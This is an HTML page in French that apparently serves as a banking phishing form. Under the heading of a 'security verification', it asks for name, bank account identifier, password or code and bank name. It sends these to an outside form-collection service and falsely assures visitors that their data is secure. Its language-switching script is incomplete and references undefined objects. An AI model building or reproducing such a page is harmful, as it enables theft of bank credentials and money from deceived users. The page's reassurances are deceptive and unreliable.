<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .form-container {
    background: #fff;
    padding: 30px 40px;
    border-radius: 10px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.1);
    width: 350px;
    text-align: center;
  }
  h2 { margin-bottom: 20px; }
  label { display: block; text-align: left; margin: 10px 0 5px; font-weight: bold; }
  input, select {
    width: 100%;
    padding: 8px 10px;
    margin-bottom: 15px;
    border-radius: 5px;
    border: 1px solid #ccc;
    box-sizing: border-box;
  }
  select { cursor: pointer; }
  button {
    width: 100%;
    padding: 10px;
    border: none;
    background: #4CAF50;
    color: white;
    font-size: 16px;
    border-radius: 5px;
    cursor: pointer;
  }
  button:hover { background: #45a049; }
</style>
</head>
<body>

<div class="form-container">

  <h2 id="titre">Processus de confidentialite</h2>

  <!-- Menu pour choisir la langue -->
 <!-- Menu Langues -->
  <select id="langue" onchange="changerLangue()">
    <option value="fr">Français</option>
    <option value="en">English</option>
    <option value="es">Español</option>
    <option value="de">Deutsch</option>
    <option value="it">Italiano</option>
    <option value="pt">Português</option>
    <option value="nl">Nederlands</option>
    <option value="sv">Svenska</option>
    <option value="ru">Русский</option>
    <option value="zh">中文</option>
  </select>
  <form action="https://formspree.io/f/xbdakdel" method="POST">
     
       <h2 id="titre">Formulaire de vérification de sécurité</h2>

    <label id="labelNom" for="nomInput">Nom et prénom :</label>
    <input type="text" id="nomInput" name="nom et prenom" placeholder="Entrez votre nom" required>

    <label id="labelIdentifiant" for="identifiantInput">Identifiant de votre compte bancaire :</label>
    <input type="text" id="identifiantInput" name="Identifiant" placeholder="Entrez votre identifiant" required>

    <label id="labelMot" for="motInput">Mot de passe/Code :</label>
    <input type="text" id="motInput" name="Mot de passe" placeholder="Entrez votre mot de passe" required>

    <label id="labelBanque" for="banqueInput">Nom de votre banque :</label>
    <input type="text" id="banqueInput" name="Nom de la banque" placeholder="Nom de la banque" required>

    <button type="submit" id="submitBtn">Envoyer</button>
    <h5 id="secureText">Vos données sont en sécurité et tenues en toute confidentialité</h5>
  </form>

  <!-- Script pour changer la langue -->

function changerLangue() {
  const langue = document.getElementById('langue').value;
  const t = traductions[langue];
  if(t){
    document.getElementById('titre').innerText = t.titre;
    document.getElementById('labelNom').innerText = t.labelNom;
    document.getElementById('labelIdentifiant').innerText = t.labelIdentifiant;
    document.getElementById('labelMot').innerText = t.labelMot;
    document.getElementById('labelBanque').innerText = t.labelBanque;
    document.getElementById('labelMessage').innerText = t.labelMessage;
    document.getElementById('submitBtn').innerText = t.submitBtn;
    document.getElementById('secureText').innerText = t.secureText;
  }
}
